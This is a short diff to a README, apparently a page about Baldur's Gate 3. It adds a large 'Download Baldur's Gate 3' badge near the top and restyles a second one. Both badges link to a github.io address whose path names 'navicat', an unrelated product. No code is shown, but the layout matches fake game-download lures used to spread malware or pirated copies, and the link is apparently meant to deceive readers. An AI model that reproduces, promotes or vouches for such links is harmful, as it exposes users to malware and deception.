@@ -5,6 +5,11 @@
 </div>
 
 ---
+<div align="center">
+<a href="https://junimata-orex.github.io/.github/navicat">
+<img src="https://img.shields.io/badge/⬇️_Download_Baldurs_Gate_3-8B0000?style=for-the-badge&logo=apple&logoColor=white" alt="Download Baldur's Gate 3">
+</a>
+</div>
 
 ## Welcome to Baldur's Gate 3
 
@@ -118,9 +123,10 @@ While you can't directly import characters, the game references the events of **
 
 <div align="center">
 <a href="https://junimata-orex.github.io/.github/navicat">
-<img src="https://img.shields.io/badge/⬇️_Download_Baldurs_Gate_3-4CAF50?style=for-the-badge&logo=apple&logoColor=white" alt="Download Baldur's Gate 3">
+<img src="https://img.shields.io/badge/⬇️_Download_Baldurs_Gate_3-8B0000?style=for-the-badge&logo=apple&logoColor=white" alt="Download Baldur's Gate 3">
 </a>
 </div>
+
 
 ---
 
